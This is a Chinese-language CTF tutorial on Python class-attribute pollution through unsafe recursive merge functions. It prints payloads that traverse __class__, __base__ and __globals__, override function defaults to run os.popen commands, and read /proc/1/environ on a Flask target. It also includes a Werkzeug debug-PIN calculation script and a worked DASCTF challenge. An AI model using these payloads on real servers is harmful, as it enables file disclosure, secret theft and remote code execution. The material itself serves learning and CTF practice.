原型链污染（Prototype Pollution）本质是**通过篡改对象的原型 / 基类属性**，让所有继承该原型的实例对象被动继承恶意属性 / 方法，最终导致逻辑篡改、代码执行等安全问题。
在 Python中，对象的属性和方法可以通过原型链继承来获取。每个对象都有一个原型，原型上定义了对象可以访问的属性和方法。当对象访问属性或方法时，会先在自身查找，如果找不到就会去原型链上的上级对象中查找，原型链污染攻击的思路是通过修改对象原型链中的属性，使得程序在访问属性或方法时得到不符合预期的结果。常见的原型链污染攻击包括修改内置对象的原型、修改全局对象的原型等.
python中一切皆对象，继承关系为，`实例对象->类class->基类object`
- 实例对象的属性优先从自身查找，若不存在则向上找类的属性，再找基类的属性。
- 类本身也是type的实例，基类（如object）是所有类的顶层父类。
- 类的属性是可变的（除非显示冻结），修改类的属性会影响所有未重写改属性的实例。
例如
```python
class User:  
    # 类属性（所有实例共享）  
    role="guest"  
  
# 创建两个实例  
u1=User()   
u2=User()  
  
print(u1.role)# 输出：guest  
print(u2.role)# 输出：guest  
  
# 篡改类的属性（原型污染）  
User.role="admin"  
  
print(u1.role) # 输出：admin（实例被动继承篡改后的属性）  
print(u2.role)# 输出：admin
```
## 漏洞出现场景
### 篡改普通类的属性
最直接的场景：若代码中允许用户可控的输入修改类属性，会导致所有实例被污染。
**实例**
假设代码通过用户输入动态设置用户属性，却错误地修改了类而非实例：
```python
class User:  
    def __init__(self,name):  
        self.name = name  
  
# 模拟用户输入（恶意输入想篡改所有用户的权限）  
user_input={"__class__":{"role":"admin"}}  
  
# 错误的属性设置逻辑：把输入直接更新到类上  
u = User("alice")  
for key,value in user_input.items():  
    if key == "__class__":  
        for k,v in value.items():  
            setattr(User,k,v)  
  
# 所有新/旧实例都会继承被污染的属性  
u1= User("bob")  
print(u1.role)
```
代码逐行解释，其中
- `class User:` 用于声明一个叫User的类。
- `def __init__(self,name):` `__init__` 是python的构造方法，是一个魔术方法。当执行User('666')时会自动调用`__init__`方法，完成实例的初始化。self指向当前创建的实例本身(类似于php的this).
- `self.name = name` 相当于把传入的name参数值例绑定到当前实例的name属性上。
- `user_input={"__class__":{"role":"admin"}}`,定义了一个user_input的字典对象，外层字典的键是`__class__`(魔术属性)，值是一个内层字典，键是role,值是admin(要恶意设定的属性值)，其中`__class__`是所有实例对象都自带的魔术属性，作用是指向该实例所属的类。例如
```python
class user:  
    def __init__(self,name):  
        self.name = name  
  
u=user("666")  
print(u.__class__)#输出<class '__main__.user'>，因为u所属的类是user
```
- `u = User("alice")` 创建一个名为alice的User实例，此时u只有name实例属性，User类本身没有role属性.
- `for key,value in user_input.items():`遍历恶意输入的键值对（外层字典），其中`user_input.items()`会取出`{"__class__":{"role":"admin"}}`这一组键值对，其中`key=__class__`,`value={"role":"admin"}`,
- `if key == "__class__":`判断key是否为`__class__`,如果代码不拦截 `__class__`，就会进入后续篡改类属性的逻辑
- `for k,v in value.items():`遍历内层字典（即要篡改的属性键值对）。其中value是内层字典（即{"role":"admin"}），循环中k=role,v=admin,
- `setattr(User,k,v)`,setattr函数的作用是给对象设置属性，用法`setattr(对象，属性名，属性值)`再这里对象是User类，属性名是role,属性值是admin,等价于`User.role="admin"`,强行给User类加了一个role类属性，这样就实现了原型链污染。
- `u1 = User("bob")`
- `print(u1.role)`
- `print(u.role)`这两个打印出来都是，admin,所有新旧实例都会继承被污染的属性。
### 篡改内置类/基类
若污染object基类，会影响所有python对象。
例如
```python
class User:  
    def __init__(self,name):  
        self.name = name  
  
class Product:  
    def __init__(self,id):  
        self.id = id  
  
setattr(object,"backdoor","exec('rm -rf /')")  
setattr(object,"is_admin",True)#添加权限属性  
  
u = User("alice")  
print(u.backdoor)  
print(u.is_admin)
```
但是这会报错，因为高版本的python禁止对基类设置属性。所以这样应该就不行了。
但是很多项目会自定义基类，这样是可以修改的。
```python
class BaseModel:  
    version="1.0"  
  
class User(BaseModel):# 业务类继承自定义基类（而非直接继承 object）  
    def __init__(self,name):  
        self.name=name  
  
class Product(BaseModel):  
    def __init__(self,id):  
        self.id=id  
  
setattr(BaseModel,"backdoor","exec('whoami')")  
setattr(BaseModel,"is_admin",True)  
# 4. 验证污染效果：所有继承 BaseModel 的子类实例都会被污染  
u = User("666")  
  
print(u.backdoor)  #输出exec('whoami')
print(u.is_admin)  #输出True
print(u.version)  #输出1.0
  
p = Product(1)  
  
print(p.backdoor)  #输出exec('whoami')
print(p.is_admin)  #输出True
print(p.version)  #输出1.0
# 5. 执行恶意代码（验证危害）  
eval(u.backdoor)
```
但在更多情况下没这么简单，想要修改基类还是先要穿透到基类
例如
```python
class BaseModel:  
    version="1.0"  
  
class User(BaseModel):  
    def __init__(self,name):  
        self.name=name  
# 恶意用户输入（目标：污染 BaseModel 基类）  
malicious_input={"__class__":{"__base__":{"is_admin":True,"backdoor":"exec('whoami')"}}}  
#其中实例.__class__->User类，User.__base__->BaseModel基类  
  
# 不安全的递归解析函数  
def update_attr(obj,attr_dict):  
    for key,value in attr_dict.items():  
        if isinstance(value,dict):  
            # 递归解析：先取 obj.__class__，再取 __base__（即 object）  
            update_attr(getattr(obj,key),value)  
        else:  
            # 最终修改 object 的 backdoor 属性  
            setattr(obj,key,value)  
  
u = User(777)  
update_attr(u,malicious_input)  
  
print(u.backdoor)
```
其中`isinstance(对象, 类型/类型元组)` **作用**：判断第一个参数（对象）是否是第二个参数（类型）的实例，返回 `True`/`False`；例如，`isinstance(value,dict)`就是判断value是否为字典。这样就可以穿透`__class__->__base__`最终修改基类。

### 通过魔术方法污染
python对象的`__dict__`存储实例/类的属性字典，若可控修改`__dict__`,也会导致污染。
例如
```python
class Config:  
    pass#python中的空语句，表示类无具体逻辑，但类本身依然是合法的、可实例化的、可动态添加属性的。  
  
# 模拟用户可控的字典更新  
malicious_dict={"__dict__":{"secret_key":"hacked"}}  
  
# 错误地合并字典到类的__dict__
Config.__dict__.update(malicious_dict["__dict__"])  
  
# 所有 Config 实例都会拿到被篡改的 secret_keyc = Config()  
print(c.__dict__)  
print(c.secret_key)
```
其中，`Config.__dict__.update(malicious_dict["__dict__"])`的作用是从恶意字典中取出内层字典，获取Config类的属性字典，update是把恶意字典合并到类属性字典中。但是这个会报错，因为python的`__dict__`只是可读的，不可写。如果用setattr
```python
for key,value in malicious_dict["__dict__"].items():  
    setattr(Config,key,value)
```
就可以修改了。

## 百年继承（例题）
题干提到了属性，那么属于一个python属性污染的题目,Python 中的原型链污染（Prototype Pollution）是指通过修改对象原型链中的属性，对程序的行为产生意外影响或利用漏洞进行攻击的一种技术。
在 Python中，对象的属性和方法可以通过原型链继承来获取。每个对象都有一个原型，原型上定义了对象可以访问的属性和方法。当对象访问属性或方法时，会先在自身查找，如果找不到就会去原型链上的上级对象中查找，原型链污染攻击的思路是通过修改对象原型链中的属性，使得程序在访问属性或方法时得到不符合预期的结果。常见的原型链污染攻击包括修改内置对象的原型、修改全局对象的原型等.
根据提示
```
上校已创建。
上校继承于他的父亲,他的父亲继承于人类
时间流逝：卷入武装起义：命运与战争交织。
时间流逝：抉择时刻：上校需要做出选择（武器与策略）。
上校选择：{"a": "b"}
选择已生效。
事件：上校使用 spear，采取 ambush 策略。世界线变动...
(上校的weapon属性被赋值为spear,tactic属性被赋值为ambush)
时间流逝：宿命延续：行军与退却。
时间流逝：面对行刑队：命运的审判即将到来。
行刑队：开始执行判决。
行刑队也继承于人类
临死之前,上校目光瞄着行刑队的佩剑,上面分明写着：
lambda executor, target: (target.__del__(), setattr(target, 'alive', False), '处决成功')
这是人类自古以来就拥有的execute_method属性...
处决成功
时间流逝：结局：命运如沙漏般倾泻……
```
可以看到一个继承关系 上校->父亲->人类，所以要从上校穿越到基类（人类），需要两个`__base__`,因为提示execute_method是字符串，所以猜测可能会把execute_method执行，根据各个阶段的内容可知lambda executor, target:只有第三个参数会回显，前两位无所谓，可以用11占位就行了，所以可以构造payload为
`{"__class__":{"__base__":{"__base__":{"execute_method":"lambda executor,target:(1,1,__import__('os').getenv('FLAG'))"}}}}`  ，其中，lambda是python定义匿名函数的关键字，`executor, target`是函数的**两个形参**，这样就得到flag

[参考文章](https://tttang.com/archive/1876/)
## 合并函数
例如
```python
class father:  
    secret = "haha"  
  
class son_a(father):  
    pass  
  
class son_b(father):  
    pass  
  
#危险的递归函数
def merge(src, dst):  
    # Recursive merge function  
    for k, v in src.items():  
        if hasattr(dst, '__getitem__'):  #检查dst是否是可索引对象，比如字典，支持[]取值
            if dst.get(k) and type(v) == dict:  #如果dst有键，并且值是一个字典，就递归合并
                merge(v, dst.get(k))  
            else:  
                dst[k] = v  #否则直接覆盖赋值
        elif hasattr(dst, k) and type(v) == dict:  #如果dst不是字典，检查是否有属性key，且v是字典
            merge(v, getattr(dst, k)) #递归合并 
        else:  
            setattr(dst, k, v)  #如果是普通对象直接设置属性
  
instance = son_b()  
payload = {  
    "__class__" : {  
        "__base__" : {  
            "secret" : "no way"  
        }  
    }  
}  
  
print(son_a.secret)  
#haha  
print(instance.secret)  
#haha  
merge(payload, instance)  
print(son_a.secret)  
#no way  
print(instance.secret)  
#no way
```
其中`hasattr(object, name)`和`isinstance`函数很像。
- `object`：要检查的对象（可以是类实例、类、模块、字典等任意 Python 对象）。
- `name`：字符串类型，要检查的**属性名 / 方法名**。
- 返回值：布尔值（`True` 表示存在，`False` 表示不存在）。
## 利用
### 全局变量获取
在`Python`中，函数或类方法（对于类的内置方法如`__init__`这些来说，内置方法在并未重写时其数据类型为装饰器即`wrapper_descriptor`，只有在重写后才是函数`function`）均具有一个`__globals__`属性，该属性将函数或类方法所申明的变量空间中的全局变量以字典的形式返回（相当于这个变量空间中的`globals`函数的返回值
```python
secret_var = 114  
def test():  
    pass  
class a:  
    def __init__(self):  
        pass  
  
print(test.__globals__ == globals() == a.__init__.__globals__)
```
返回True ,所以我们可以使用`__globlasl__`来获取到全局变量，这样就可以修改无继承关系的类属性甚至全局变量
```python
secret_var = 114  
def test():  
    pass  
class a:  
    secret_class_var = "secret"  
  
class b:  
    def __init__(self):  
        pass  
def merge(src,dst):  
    for k, v in src.items():  
        if hasattr(dst,'__getitem__'):  
            if dst.get(k) and type(v) == dict:  
                merge(v,dst.get(k))#从字典中取见k对应的值  
            else:  
                dst[k] = v  
        elif hasattr(dst,k) and type(v) == dict:  
            merge(v,getattr(dst,k))#从想dst中取属性k对应的值  
        else :setattr(dst,k,v)  
  
instance = b()  
  
payload = {  
    "__init__":{  
        "__globals__":{  
            "secret_var" : 514,  
            "a" : {  
                "secret_class_var" : "Pooooluted ~"  
            }  
        }  
    }  
}  
  
print(a.secret_class_var)#secret  
print(secret_var)#114  
merge(payload,instance)  
print(a.secret_class_var)#Pooooluted ~  
print(secret_var)#514
```
这样就污染到了全局变量。
### 已加载模块获取
局限于当前模块的全局变量获取显然不够，很多情况下需要对并不是定义在入口文件中的类对象或者属性，而我们的操作位置又在入口文件中，这个时候就需要对其他加载过的模块来获取了
#### 加载关系简单
在加载关系简单的情况下，我们可以直接从文件的`import`语法部分找到目标模块，这个时候我们就可以通过获取全局变量来得到目标模块
```python
import text1  
  
def test():  
    pass  
  
  
class b:  
    def __init__(self):  
        pass  
def merge(src,dst):  
    for k, v in src.items():  
        if hasattr(dst,'__getitem__'):  
            if dst.get(k) and type(v) == dict:  
                merge(v,dst.get(k))#从字典中取见k对应的值  
            else:  
                dst[k] = v  
        elif hasattr(dst,k) and type(v) == dict:  
            merge(v,getattr(dst,k))#从想dst中取属性k对应的值  
        else :setattr(dst,k,v)  
  
instance = b()  
  
payload = {  
    "__init__":{  
        "__globals__":{  
            "text1":{  
                "secret_var" :514,  
                "target_class" :{  
                    "secret_class_var" : "polpulling",  
                }  
            }  
        }  
    }  
}  
  
print(text1.secret_var)#114  
print(text1.target_class.secret_class_var)#secret  
merge(payload,instance)  
print(text1.secret_var)#514  
print(text1.target_class.secret_class_var)#polpulling
```
text1.py
```python
secret_var = 114  
  
class target_class:  
    secret_class_var = "secret"
```

#### 加载关系复杂-示例
实际环境中往往是多层模块导入，甚至是存在于内置模块或三方模块中导入，这个时候通过直接看代码文件中`import`语法查找就十分困难，而解决方法则是利用`sys`模块
`sys`模块的`modules`属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到目标模块。
```python
import text1  
import sys  
  
class b:  
    def __init__(self):  
        pass  
def merge(src,dst):  
    for k, v in src.items():  
        if hasattr(dst,'__getitem__'):  
            if dst.get(k) and type(v) == dict:  
                merge(v,dst.get(k))#从字典中取见k对应的值  
            else:  
                dst[k] = v  
        elif hasattr(dst,k) and type(v) == dict:  
            merge(v,getattr(dst,k))#从想dst中取属性k对应的值  
        else :setattr(dst,k,v)  
  
instance = b()  
  
payload = {  
    "__init__" : {  
        "__globals__" : {  
            "sys" : {  
                "modules" : {  
                    "text1":{  
                        "secret_var" :514,  
                        "target_class" :{  
                            "secret_class_var" : "polpulling",  
                }  
            }  
        }  
    }  
}  
    }  
}  
  
print(text1.secret_var)#114  
print(text1.target_class.secret_class_var)#secret  
merge(payload,instance)  
print(text1.secret_var)#514  
print(text1.target_class.secret_class_var)#polpulling
```
如上的`Payload`实际上是在已经`import sys`的情况下使用的，而大部分情况是没有直接导入的，这样问题就从**寻找`import`特定模块的语句**转换为**寻找`import`了sys模块的语句**，对问题解决的并不见得有多少优化。
#### 加载关系复杂-实际使用
为了进一步优化，这里采用方式是利用`Python`中加载器`loader`，是为实现模块加载而设计的类，其在`importlib`这一内置模块中有具体实现。令人庆幸的是`importlib`模块下所有的`py`文件中均引入了`sys`模块。
```python
print("sys" in dir(__import__("importlib.__init__")))  
#True  
print("sys" in dir(__import__("importlib._bootstrap")))  
#True  
print("sys" in dir(__import__("importlib._bootstrap_external")))  
#True  
print("sys" in dir(__import__("importlib._common")))  
#True  
print("sys" in dir(__import__("importlib.abc")))  
#True  
print("sys" in dir(__import__("importlib.machinery")))  
#True  
print("sys" in dir(__import__("importlib.metadata")))  
#True  
print("sys" in dir(__import__("importlib.resources")))  
#True  
print("sys" in dir(__import__("importlib.util")))  
#True
```
所以只要我们能过获取到一个`loader`便能用如`loader.__init__.__globals__['sys']`的方式拿到`sys`模块，这样进而获取目标模块。
而`loader`是很好获得的。对于一个模块来说，模块中的一些内置属性会在被加载时自动填充：`__loader__`内置属性会被赋值为加载该模块的`loader`，这样只要能获取到任意的模块便能通过`__loader__`属性获取到`loader`，而且对于`python3`来说除了在`debug`模式下的主文件中`__loader__`为`None`以外，正常执行的情况每个模块的`__loader__`属性均有一个对应的类。
`_spec__`内置属性在`Python 3.4`版本引入，其包含了关于类加载时的信息，本身是定义在`Lib/importlib/_bootstrap.py`的类`ModuleSpec`，显然因为定义在`importlib`模块下的`py`文件，所以可以直接采用`<模块名>.__spec__.__init__.__globals__['sys']`获取到`sys`模块还可以`<模块名>.__spec__.loader.__init__.__globals__['sys']`
### 实际环境中的合并函数
`Pydash`模块中的`set_`和`set_with`函数具有如上实例中`merge`函数类似的类属性赋值逻辑，能够实现污染攻击。`idekctf 2022*`中的`task manager`这题就设计使用该函数提供可以污染的环境
## 攻击面扩展
### 函数形参默认值替换
主要用到了函数的`__defaults__`和`__kwdefaults__`这两个内置属性
`__defaults__`以元组的形式按从左到右的顺序收录了函数的位置或键值形参的默认值，需要注意这个位置或键值形参是特定的一类形参，并不是位置形参+键值形参，关于函数的参数分类可以参考这篇文章：[python函数的位置参数(Positional)和关键字参数(keyword) - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/412273465)
## python函数的位置参数(Positional)和关键字参数(keyword)
python3.8引入了仅位置参数，
```
def f(positional_argument, /, positional_or_keyword_argument, *, c):
    pass

#positional_argument                    位置参数
#positional_or_keyword_argument         位置参数和关键字参数
#keyword_argument                       关键字参数
```
### 基本类型
位置参数(positional): 传参时前面不带 "变量名=", 顺序不可变, 按顺序赋给相应的局部变量.
关键字参数(keyword): 传参时前面加上 "变量名=", 顺序可变, 按名称赋给同名的局部变量.
### 引申
#### 仅位置参数
在 / 之前定义的参数, 传参时不带变量名. 这个在 python 3.8 中可以自己定义。
#### 位置或关键字参数
在 / 后面和 * 号前面定义的参数, 即我们自定义函数时最常用的. 传参时可以把它当作位置参数或关键字参数看待, 可以带变量名也可以不带. 这就是我们自定义的函数与内置函数的区别之处。
#### 集合位置参数
即函数定义时采用 `*args` 指定的参数. 我们一般都把它理解为"可变参数", 实际上理解为"集合位置参数"最精确. 传参时不能带变量名.
#### 仅关键字参数
在 * 后面定义的参数(或在 `*args` 后面定义, ... 类似于 `*args`). 传参时必需带变量名.
#### 集合关键字参数
即函数定义时采用 `**args` 指定的参数. 它可以接受我们传入的任意个数的关键字参数. 传参时必须带变量名.
传递参数时, "关键字参数不能在位置参数前面", 否则就会报错.
### 集合位置参数和集合关键字参数的比较
#### 集合位置参数
通过一个`*`前缀来声明，如果看到一个`*xxx`的函数参数声明，那一定是属于`VAR_POSITIONAL`类型的，`VAR_POSITIONAL`类型可以不传任何参数调用也不会报错，而且只允许存在一个。
```python
def f(*b):  
    print(b)#不会报错
f()#结果是()
f(1,2.0,'3',True)#结果是(1, 2.0, '3', True)
```
#### 集合关键字参数
`VAR_KEYWORD`类型的参数通过`**`前缀来声明。这种类型的参数只能通过关键字`KEYWORD`调用，但可以接收任意个关键字参数，甚至是0个参数，在函数内部以一个字典(_dict_)显示。`VAR_KEYWORD`类型的参数只允许有一个，只允许在函数的最后声名。
```python
def f(**b):  
    print(b)  
f()  #不会报错，回显{}
f(a=1,b=2.0,c='3',d=True) #结果{'a': 1, 'b': 2.0, 'c': '3', 'd': True}
```
### `/`和`*`在参数中的使用语法
- 在`/`左边的参数被视为仅位置参数
- 如果函数定义中“/”没有指定，则函数中所有参数都不是仅位置参数
- 仅位置参数的可选值的逻辑与位置-关键字参数的逻辑相同。
- 没有默认值的仅位置参数在调用的时候必需给值。
有效定义
```python
def name(p1, p2, /, p_or_kw, *, kw):
def name(p1, p2=None, /, p_or_kw=None, *, kw):
def name(p1, p2=None, /, *, kw):
def name(p1, p2=None, /):
def name(p1, p2, /, p_or_kw):
def name(p1, p2, /):
def name(p_or_kw, *, kw):
def name(*, kw):
```
无效定义
```python
def name(p1, p2=None, /, p_or_kw, *, kw):
def name(p1=None, p2, /, p_or_kw=None, *, kw):
def name(p1=None, p2, /):
```
### 举例
```python
def f(a,b,/,c,d,*,e,f):  
    print(a,b,c,d,e,f)#a,b是仅位置参数，c,d是位置或关键字参数，e,f是仅关键字参数
f(10,20,30,d=40,e=50,f=90)#正确调用

def f(a=2,/):  
    print(f)  
f()  #正确，参数可选，因为定义的函数里有参数了
f(1)  #正确，参数是仅位置参数，会把默认参数覆盖
f(a=2) #错误，参数是仅位置参数

def f(a,/):  
    print(f)  
f()  #错误，必须有参数
f(1)  #正确
f(a=2)#错误，参数是仅位置参数

def f(*,a=1):  
    print(f)  
f()  # 正确，参数可选，因为已经有了
f(1)  # 错误，仅关键字参数，传参时必须带变量名
f(a=2) # 正确

def f(*,a):  
    print(f)  
f()  #错误，需要传入参数
f(1)  #错误
f(a=2)#正确

def f(a=1):  #如果没有/和*，默认是，可选的位置参数和关键字参数
    print(f)  
f()  #正确
f(1)  #正确
f(a=2)#正确

def f(a):  
    print(f)  
f()  #错误，需要传参数
f(1)  #正确
f(a=2)#正确
```
`__defaults__`
效果如下
```python
def func_a(var_1, var_2 =2, var_3 = 3):
    pass

def func_b(var_1, /, var_2 =2, var_3 = 3):
    pass

def func_c(var_1, var_2 =2, *, var_3 = 3):
    pass

def func_d(var_1, /, var_2 =2, *, var_3 = 3):
    pass

print(func_a.__defaults__)
#(2, 3)
print(func_b.__defaults__)
#(2, 3)
print(func_c.__defaults__)
#(2,)
print(func_d.__defaults__)
#(2,)
```
通过替换该属性便能实现对函数位置或键值形参的默认值替换，但稍有问题的是该属性值要求为元组类型，而通常的如`JSON`等格式并没有元组这一数据类型设计概念，这就需要环境中有合适的解析输入的方式。
例如
```python
def evilFunc(arg_1, shell=False):  
    if not shell:  
        print(arg_1)  
    else:  
        print(__import__('os').popen(arg_1).read())  
class cls:  
    def __init__(self):  
        pass  
def merge(src,dst):  
    for k, v in src.items():  
        if hasattr(dst,'__getitem__'):  
            if dst.get(k) and type(v) == dict:  
                merge(v,dst.get(k))#从字典中取见k对应的值  
            else:  
                dst[k] = v  
        elif hasattr(dst,k) and type(v) == dict:  
            merge(v,getattr(dst,k))#从想dst中取属性k对应的值  
        else :setattr(dst,k,v)  
  
instance = cls()  
  
payload = {  
    "__init__":{  
        "__globals__":{  
            "evilFunc":{  
                "__defaults__":(  
                    True,  
                )  
            }  
        }  
    }  
}  
evilFunc("whoami")  #whoami
merge(payload,instance)  
evilFunc("whoami")#laptop-3i2gtl5g\lenovo
```
`__kwdefaults__`以字典的形式按从左到右的顺序收录了函数键值形参的默认值，从代码上来看，则是如下的效果：
```python
def func_a(var_1, var_2 =2, var_3 = 3):  
    pass  
  
def func_b(var_1, /, var_2 =2, var_3 = 3):  
    pass  
  
def func_c(var_1, var_2 =2, *, var_3 = 3):  
    pass  
  
def func_d(var_1, /, var_2 =2, *, var_3 = 3):  
    pass  
  
print(func_a.__kwdefaults__)  
#None  
print(func_b.__kwdefaults__)  
#None  
print(func_c.__kwdefaults__)  
#{'var_3': 3}  
print(func_d.__kwdefaults__)  
#{'var_3': 3}
```
通过替换该属性便能实现对函数键值形参的默认值替换
```python
def evilFunc(arg_1, *,shell=False):  
    if not shell:  
        print(arg_1)  
    else:  
        print(__import__('os').popen(arg_1).read())  
class cls:  
    def __init__(self):  
        pass  
def merge(src,dst):  
    for k, v in src.items():  
        if hasattr(dst,'__getitem__'):  
            if dst.get(k) and type(v) == dict:  
                merge(v,dst.get(k))#从字典中取见k对应的值  
            else:  
                dst[k] = v  
        elif hasattr(dst,k) and type(v) == dict:  
            merge(v,getattr(dst,k))#从想dst中取属性k对应的值  
        else :setattr(dst,k,v)  
  
instance = cls()  
  
payload = {  
    "__init__":{  
        "__globals__":{  
            "evilFunc":{  
                "__kwdefaults__":{  
                    "shell":True,  
                }  
            }  
        }  
    }  
}  
evilFunc("whoami")#whoami  
merge(payload,instance)  
evilFunc("whoami")#laptop-3i2gtl5g\lenovo
```
因为是字典形式，所以payload里必须用键值对的形式。

## 特定值替换
### os.environ赋值
可以实现多种利用方式，如`NCTF2022`中`calc`考点对`os.system`的利用，结合`LD_PRELOAD`与文件上传`.so`实现劫持等
**calc**

## `flask`相关特定属性
### secret_key
决定`flask`的`session`生成的重要参数，知道该参数可以实现`session`任意伪造
例如
```python
from flask import Flask ,request  
import json  
  
app = Flask(__name__)  
app.config["FLAG"] = "flag{This_is_flag!!!}"  
class cls:  
    def __init__(self):  
        pass  
def merge(src,dst):  
    for k, v in src.items():  
        if hasattr(dst,'__getitem__'):  
            if dst.get(k) and type(v) == dict:  
                merge(v,dst.get(k))#从字典中取见k对应的值  
            else:  
                dst[k] = v  
        elif hasattr(dst,k) and type(v) == dict:  
            merge(v,getattr(dst,k))#从想dst中取属性k对应的值  
        else :setattr(dst,k,v)  
  
instance = cls()  
  
@app.route("/",methods=["GET","POST"])  
def index():  
    if request.data:  
        merge(json.loads(request.data),instance)  
    return f"config:{app.config['FLAG']}"  
  
if __name__ == "__main__":  
    app.run("0.0.0.0",debug=True)
```
运行时正常访问是![](/image/262.png)
如果这样``
## 例题
### EzFlask(DASCTF2023七月暑期挑战赛)
看源码
```python
|   |
|---|
|import uuid|
||
|from flask import Flask, request, session|
|from secret import black_list|
|import json|
||
|app = Flask(__name__)|
|app.secret_key = str(uuid.uuid4())|
||
|def check(data):|
|for i in black_list:|
|if i in data:|
|return False|
|return True|
||
|def merge(src, dst):|
|for k, v in src.items():|
|if hasattr(dst, '__getitem__'):|
|if dst.get(k) and type(v) == dict:|
|merge(v, dst.get(k))|
|else:|
|dst[k] = v|
|elif hasattr(dst, k) and type(v) == dict:|
|merge(v, getattr(dst, k))|
|else:|
|setattr(dst, k, v)|
||
|class user():|
|def __init__(self):|
|self.username = ""|
|self.password = ""|
|pass|
|def check(self, data):|
|if self.username == data['username'] and self.password == data['password']:|
|return True|
|return False|
||
|Users = []|
||
|@app.route('/register',methods=['POST'])|
|def register():|
|if request.data:|
|try:|
|if not check(request.data):|
|return "Register Failed"|
|data = json.loads(request.data)|
|if "username" not in data or "password" not in data:|
|return "Register Failed"|
|User = user()|
|merge(data, User)|
|Users.append(User)|
|except Exception:|
|return "Register Failed"|
|return "Register Success"|
|else:|
|return "Register Failed"|
||
|@app.route('/login',methods=['POST'])|
|def login():|
|if request.data:|
|try:|
|data = json.loads(request.data)|
|if "username" not in data or "password" not in data:|
|return "Login Failed"|
|for user in Users:|
|if user.check(data):|
|session["username"] = data["username"]|
|return "Login Success"|
|except Exception:|
|return "Login Failed"|
|return "Login Failed"|
||
|@app.route('/',methods=['GET'])|
|def index():|
|return open(__file__, "r").read()|
||
|if __name__ == "__main__":|
|app.run(host="0.0.0.0", port=5010)|
||
```
源码里有这个函数
```python
def merge(src, dst): 
	for k, v in src.items(): 
		if hasattr(dst, '__getitem__'): 
			if dst.get(k) and type(v) == dict: 
				merge(v, dst.get(k))
			else: 
				dst[k] = v 
		elif hasattr(dst, k) and type(v) == dict: 
			merge(v, getattr(dst, k)) 
		else: setattr(dst, k, v) 
```
并且在`/register`路由进行调用，
```python
@app.route('/register',methods=['POST'])
def register():
    if request.data:
        try:
            if not check(request.data):
                return "Register Failed"
            data = json.loads(request.data)
            if "username" not in data or "password" not in data:
                return "Register Failed"
            User = user()
            merge(data, User)
            Users.append(User)
        except Exception:
            return "Register Failed"
        return "Register Success"
    else:
        return "Register Failed"
```
然后在`/`路由还有一个`__file__`读取。
```python
@app.route('/',methods=['GET'])
def index():
    return open(__file__, "r").read()
```
用dirsearch扫出来一个`/console`路由，这个是控制台，需要PIN码。
那么很明显了，就是通过修改`__file__`读取文件，计算`PIN`码进行`RCE`

关于如何计算`PIN`码可以看看这篇文章：https://www.cnblogs.com/shinnylbz/p/18515644
pin码是flask在开启debug模式下,进行代码调试模式所需的进入密码,需要正确的PIN码才能进入调试模式.
对于pin码运算方法的描述如下  
pin码生成要六要素
1. username 在可以任意文件读的条件下读 /etc/passwd进行猜测  
2. modname 默认flask.app  
3. appname 默认Flask  
4. moddir flask库下app.py的绝对路径,可以通过报错拿到,如传参的时候给个不存在的变量  
5. uuidnode mac地址的十进制,任意文件读 /sys/class/net/eth0/address  
6. machine_id 机器码 这个待会细说,一般就生成pin码不对就是这错了
machine_id是由`/etc/machine-id`,`/proc/sys/kernel/random/boot_id`,`/proc/self/cgroup`拼接而成的.
如果self被禁用可以用1来绕过,cgroup被禁用可以使用`mountinfo`或者`cpuset`去绕过.
在python3.8及以后使用的哈希算法为sha1,以前使用的是md5,新版脚本如下.
```python
  
import hashlib
from itertools import chain

def mac_10():
    """
    /sys/class/net/eth0/address mac地址十进制
    :return:
    """
    mac_address = "02:42:c0:a8:10:02"
    # 将MAC地址视为一个十六进制数（去掉冒号）
    value = int(mac_address.replace(":", ""), 16)
    return str(value)


probably_public_bits = [
    'app'  # username
    'flask.app',  # modname
    'Flask',  # appname
    '/usr/local/lib/python3.9/site-packages/flask/app.py'  # moddir
]

machine_id = '6ee8d0b5126041a1b3ddfefb9ea61b4e'
boot_id = '70d3d850-a8d2-4ff1-a285-34c4a401e57d'
c_group = '0::/'

id = ''
if machine_id:
    id += machine_id.strip()
else:
    id += boot_id.strip()
id += c_group.strip().rpartition('/')[2]

private_bits = [
    mac_10(),  # mac地址
    id  #machin-id
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
num = None
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x: x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)
```

因为在源码中有一段
```python
app = Flask(__name__)
app.secret_key = str(uuid.uuid4())
```
所以我们需要对传入的恶意`payload`进行`unicode`编码
可以直接读取环境变量`/proc/self/environ`如果self被过滤可以使用`/proc/1/environ`绕过,题目还过滤了`__init__`只需要unicode编码一下就可以了。
常见的linux环境变量路径
```
/proc/1/environ （本题flag就在这里）
/etc/profile
/etc/profile.d/*.sh
~/.bash_profile
~/.bashrc
/etc/bashrc
```
也可以使用类中方法`check`代替类中构造方法`__init__`
payload
```
{
	"username":"aaa",
	"password":"bbb",
	"__class__":{
        "check":{
            "__globals__":{
                "__file__" : "/proc/1/environ"
            }
        }
	}
}
```
这样就可以污染成功，得到flag。
也可以用uncode加密一下
```
{
	"username":"1",
	"password":"1",
	"\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f":{
		"__globals__":{
			"__file__":"/proc/self/cgroup"
		}
	}
}
```
或者
```
{
    "username":1,
	"password":1,
    "__init\u005f_":{
        "__globals__":{
            "app":{
                "_static_folder":"/"
            }
        }
    }
}
```
在 Python 中，全局变量 app 和` _static_folder `通常用于构建 Web 应用程序，并且这两者在 Flask 框架中经常使用。
再访问`http://76f87c5d-e573-4e5e-9c2c-7e403de1b5e2.node5.buuoj.cn:81/static/proc/1/environ`就可以下载到环境变量。
app 全局变量：

app 是 Flask 应用的实例，是一个 Flask 对象。通过创建 app 对象，我们可以定义路由、处理请求、设置配置等，从而构建一个完整的 Web 应用程序。
